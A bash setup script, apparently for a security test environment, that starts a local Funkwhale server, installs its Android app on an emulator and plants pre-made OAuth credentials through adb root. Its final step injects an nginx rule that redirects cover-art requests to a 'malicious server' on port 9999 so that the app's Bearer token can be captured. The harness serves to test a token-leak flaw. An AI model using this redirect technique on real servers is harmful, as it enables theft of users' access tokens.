#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../utils/android.sh"
APK_PATH=$(parse_apk_path "$SCRIPT_DIR" "funkwhale" "$@")
cd "$SCRIPT_DIR"

TARGET_PACKAGE="audio.funkwhale.ffa"

setup_server(){
    log_info "Setting up local Funkwhale server with Docker"

    local server_dir="$SCRIPT_DIR/funkwhale-server"
    cd "$server_dir"

    log_info "Configuring Funkwhale server"

    mkdir -p "$server_dir/data/music" "$server_dir/data/static" "$server_dir/data/media"

    log_info "Generating .env from template..."
    sed "s|__SERVER_DIR__|$server_dir|g" .env.template > .env
    chmod 600 .env

    # Disable media proxy so cover art URLs are served directly
    echo "PROXY_MEDIA=false" >> .env

    SNAPSHOT_FILE="$server_dir/postgres-snapshot1017.tar.gz"
    VOLUME_NAME="funkwhale-server_postgres_data"

    if docker volume inspect "$VOLUME_NAME" >/dev/null 2>&1; then
        log_info "Postgres volume already exists, will use existing data"
    elif [[ -f "$SNAPSHOT_FILE" ]]; then
        log_info "Restoring database from snapshot using postgres container..."

        docker compose run --rm --no-deps \
            -v "${SNAPSHOT_FILE}:/snapshot.tar.gz:ro" \
            postgres sh -c \
            "cd /var/lib/postgresql/data && tar -xzf /snapshot.tar.gz --strip-components=1" || \
            fatal "Failed to restore database snapshot"

        log_info "Database snapshot restored to volume"
    else
        fatal "No database snapshot found at $SNAPSHOT_FILE. Please create a snapshot first."
    fi

    log_info "Pulling Docker images..."
    docker compose pull || fatal "Failed to pull Docker images"

    log_info "Starting all Funkwhale services on shared_net..."
    docker compose up -d --wait || fatal "Failed to start services or healthchecks failed"

    log_info "Database services are healthy, waiting for API and frontend to start..."

    log_info "Funkwhale server setup completed"
    log_info "API available at https://localhost/api/v1/ (HTTPS)"
    log_info "Web interface at https://localhost (HTTPS)"
}

authenticate_app() {
    log_info "Pre-authenticating Funkwhale app on emulator..."

    local server_dir="$SCRIPT_DIR/funkwhale-server"
    local emulator_hostname="https://10.0.2.2"
    local prefs_file="/tmp/funkwhale_credentials.xml"

    # Generate unique client and token values
    local client_id="funkwhale-android-$(date +%s)"
    local client_secret
    client_secret="secret-$(openssl rand -hex 16)"
    local access_token
    access_token=$(openssl rand -hex 20)

    # Create OAuth app and access token via Django management shell
    log_info "Creating OAuth credentials in database..."
    cd "$server_dir"

    docker compose exec -T api python manage.py shell -c "
from django.apps import apps
from django.contrib.auth import get_user_model
from django.utils import timezone
from datetime import timedelta

Application = apps.get_model('users', 'Application')
AccessToken = apps.get_model('users', 'AccessToken')
User = get_user_model()
user = User.objects.get(username='agent')

app = Application.objects.create(
    name='Funkwhale Android Test',
    client_id='${client_id}',
    client_secret='${client_secret}',
    client_type='confidential',
    authorization_grant_type='authorization-code',
    redirect_uris='urn:/audio.funkwhale.funkwhale-android/oauth/callback',
    skip_authorization=True,
    scope='read write',
)

token = AccessToken.objects.create(
    user=user,
    token='${access_token}',
    application=app,
    expires=timezone.now() + timedelta(days=365),
    scope='read write',
)

print(f'OK: app={app.client_id}, token={token.token[:10]}..., user={user.username}')
" || fatal "Failed to create OAuth credentials"

    log_info "OAuth credentials created in database"

    # Generate SharedPreferences XML with AppAuth AuthState JSON
    log_info "Generating SharedPreferences..."

    FW_HOSTNAME="$emulator_hostname" \
    CLIENT_ID="$client_id" \
    CLIENT_SECRET="$client_secret" \
    ACCESS_TOKEN="$access_token" \
    OUTPUT_FILE="$prefs_file" \
    python3 << 'PYEOF'
import os, json
from xml.sax.saxutils import escape

hostname = os.environ['FW_HOSTNAME']
client_id = os.environ['CLIENT_ID']
client_secret = os.environ['CLIENT_SECRET']
access_token = os.environ['ACCESS_TOKEN']
output_file = os.environ['OUTPUT_FILE']

config = {
    "authorizationEndpoint": f"{hostname}/authorize",
    "tokenEndpoint": f"{hostname}/api/v1/oauth/token/"
}

config_with_reg = {
    **config,
    "registrationEndpoint": f"{hostname}/api/v1/oauth/apps/"
}

# AppAuth v0.11.1 AuthState JSON format (key names from decompiled bytecode)
auth_state = {
    "mLastTokenResponse": {
        "request": {
            "configuration": config,
            "clientId": client_id,
            "grantType": "authorization_code"
        },
        "token_type": "Bearer",
        "access_token": access_token,
        "expires_at": 2000000000000
    },
    "lastRegistrationResponse": {
        "request": {
            "configuration": config_with_reg,
            "redirect_uris": ["urn:/audio.funkwhale.funkwhale-android/oauth/callback"]
        },
        "client_id": client_id,
        "client_secret": client_secret
    }
}

state_json = json.dumps(auth_state, separators=(',', ':'))
escaped_state = escape(state_json)

xml = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="state">{escaped_state}</string>
    <string name="hostname">{hostname}</string>
    <boolean name="anonymous" value="false" />
    <string name="actor_username">agent</string>
</map>"""

with open(output_file, 'w') as f:
    f.write(xml)

print(f'SharedPreferences XML written to {output_file}')
PYEOF

    if [[ ! -f "$prefs_file" ]]; then
        fatal "Failed to generate SharedPreferences XML"
    fi

    # Push SharedPreferences to emulator via adb root
    log_info "Pushing credentials to emulator..."
    adb root || fatal "Failed to get adb root"
    sleep 2

    local prefs_dir="/data/data/${TARGET_PACKAGE}/shared_prefs"
    adb shell "mkdir -p ${prefs_dir}" || fatal "Failed to create shared_prefs dir"
    adb push "$prefs_file" "${prefs_dir}/credentials.xml" || fatal "Failed to push credentials"
    adb shell "chmod 660 ${prefs_dir}/credentials.xml"

    # Fix ownership to match the app's UID
    local app_uid
    app_uid=$(adb shell stat -c '%u' "/data/data/${TARGET_PACKAGE}/" 2>/dev/null) || true
    if [[ -n "$app_uid" ]]; then
        adb shell "chown ${app_uid}:${app_uid} ${prefs_dir}/credentials.xml"
    fi

    # Fix SELinux context so the app can read the file
    local secontext
    secontext=$(adb shell ls -Z "/data/data/${TARGET_PACKAGE}/" | head -1 | awk '{print $1}') || true
    if [[ -n "$secontext" && "$secontext" != "?" ]]; then
        adb shell "chcon '$secontext' '${prefs_dir}/credentials.xml'" 2>/dev/null || true
        adb shell "chcon '$secontext' '${prefs_dir}/'" 2>/dev/null || true
        log_info "Applied SELinux context: $secontext"
    fi

    rm -f "$prefs_file"

    log_info "App pre-authenticated as user 'agent' at ${emulator_hostname}"
}

create_cover_art_placeholder() {
    # The snapshot has cover art attachments with file='attachments/covers/cover.png'.
    # The media volume is ephemeral, so we need to create the actual PNG file each run.
    log_info "Creating placeholder cover art image in media volume..."

    local server_dir="$SCRIPT_DIR/funkwhale-server"
    cd "$server_dir"

    docker compose exec -T api python3 -c "
import base64, pathlib
png = base64.b64decode(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4'
    'nGP4z8BQDwAEgAF/pooBPQAAAABJRU5ErkJggg=='
)
cover_dir = pathlib.Path('/srv/funkwhale/data/media/attachments/covers')
cover_dir.mkdir(parents=True, exist_ok=True)
cover_path = cover_dir / 'cover.png'
cover_path.write_bytes(png)
print(f'Created placeholder: {cover_path} ({len(png)} bytes)')
" || log_warn "Failed to create placeholder cover art"
}

inject_nginx_redirect() {
    log_info "Injecting nginx redirect for media attachments..."

    # Inject nginx redirect rule so that any request to /media/attachments/*
    # gets 302-redirected to our malicious server on port 9999.
    # The app fetches cover art -> nginx redirects -> malicious server captures Bearer token.
    local redirect_url="http://10.0.2.2:9999/malicious.png"

    docker exec front sh -c "
        # Find the active nginx config
        CONF=''
        for f in /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/funkwhale.conf; do
            if [ -f \"\$f\" ]; then CONF=\"\$f\"; break; fi
        done
        if [ -z \"\$CONF\" ]; then
            echo 'ERROR: No nginx config found'
            exit 1
        fi
        echo \"Using nginx config: \$CONF\"

        if grep -q 'media/attachments' \"\$CONF\" 2>/dev/null; then
            echo 'Nginx redirect already present'
        else
            # Insert redirect block before the existing /media/ location
            sed -i '/location \/media\//i \\
    location /media/attachments/ {\\
        return 302 ${redirect_url};\\
    }' \"\$CONF\"
            nginx -s reload
            echo 'Nginx redirect injected and reloaded'
        fi

        # Verify the redirect is in place
        echo '--- Nginx config snippet ---'
        grep -A2 'media/attachments' \"\$CONF\" || echo 'WARNING: redirect not found in config'
        echo '--- End snippet ---'
    " || log_warn "Failed to inject nginx redirect"

    # Verify redirect works from the host
    local redirect_check
    redirect_check=$(curl -sk -o /dev/null -w "%{http_code}" "https://localhost/media/attachments/test.png" 2>/dev/null) || true
    log_info "Nginx redirect test: GET /media/attachments/test.png -> HTTP $redirect_check (expect 302)"

    log_info "Nginx redirect injection completed"
}

main(){
    log_info "Starting Funkwhale server + app setup"
    setup_server

    adb_install_apk "$APK_PATH"
    authenticate_app

    # The snapshot already contains playable albums with cover art attachments.
    # We just need to create the placeholder PNG (media volume is ephemeral)
    # and inject the nginx redirect to route cover art requests to our malicious server.
    create_cover_art_placeholder
    inject_nginx_redirect

    log_info "Funkwhale server + app setup completed successfully!"
}

main "$@"
